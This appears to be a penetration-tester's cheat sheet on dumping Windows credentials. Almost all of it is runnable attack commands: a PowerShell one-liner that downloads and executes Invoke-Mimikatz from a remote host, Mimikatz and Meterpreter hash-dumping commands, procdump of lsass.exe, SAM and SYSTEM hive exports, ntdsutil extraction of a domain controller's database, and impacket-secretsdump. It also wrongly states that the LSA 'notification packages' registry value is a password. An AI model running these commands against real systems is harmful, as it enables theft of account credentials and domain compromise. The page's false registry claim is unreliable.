---
layout: default
---

<[Back to Main Page](../index.html)

# Dumping Credentials with Mimikatz and Other Tools
## Usefull Information
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-credentials-from-lsass.exe-process-memory
https://www.offensive-security.com/metasploit-unleashed/mimikatz/

## Download
```powershell
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```

## Mimkatz Commands
Checking permissions:  
privilege::debug  
Dumping passwords:  
sekurlsa::logonpasswords  
Dumping passwords cleartext:  
sekurlsa::wdigest  

With Meterpreter you can use these following commands:  
hashdump  
load mimikatz  
help mimikatz  
mimikatz_command -f version  

Other Meterpreter commands which use Mimikatz
msv  
kerberos  
mimikatz_command -f samdump::hashes  

# Dumping Credentials without Mimikatz
## Dimping Lsass without mimikatz
1. Open Task Manager
2. Rignt click on lsass.exe

## Dumping with Procdump
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp

// or avoid reading lsass by dumping a cloned lsass process
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```

## Creds in Registry
```powershell
reg query HKLM /f password /t REG_SZ /s
# or
reg query HKCU /f password /t REG_SZ /s
```
Passwords can be found with this filter
```powershell
reg query "hklm\system\currentcontrolset\control\lsa" /v "notification packages"
```
value of notification packages is a password

## Dumping SAM Registry
```powershell
reg save hklm\system system
reg save hklm\sam sam
```

# Dumping a Domain Controller
## Dumping DC Passwords Locally
```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

## Dumping DC Passwords Remotly (Password Required)
```powershell
impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6
```
